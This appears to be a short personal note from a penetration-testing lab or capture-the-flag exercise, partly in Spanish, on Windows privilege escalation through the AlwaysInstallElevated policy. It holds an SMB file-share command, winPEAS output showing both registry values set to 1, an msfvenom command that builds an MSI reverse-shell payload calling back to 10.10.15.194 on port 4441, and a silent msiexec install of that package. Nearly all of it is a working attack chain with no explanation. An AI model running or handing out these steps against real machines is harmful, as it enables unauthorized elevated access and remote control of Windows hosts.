sudo smbserver.py smbfolder $(pwd) -smb2support 

winpeas 


https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated

 498 │ ����������͹ Checking AlwaysInstallElevated (T1548.002)
 499 │ �  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
 500 │     HKLM policy value: 1
 501 │     HKCU policy value: 1
 502 │     Both AlwaysInstallElevated policy values are 1: review elevated MSI installation for this user (value types and effective policy are unverified).


msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.194 LPORT=4441 --platform windows -a x64 -f msi -o alwe.msi

msiexec /quiet /qn /i alwe.msi


puerto 4441 en escucha y gg
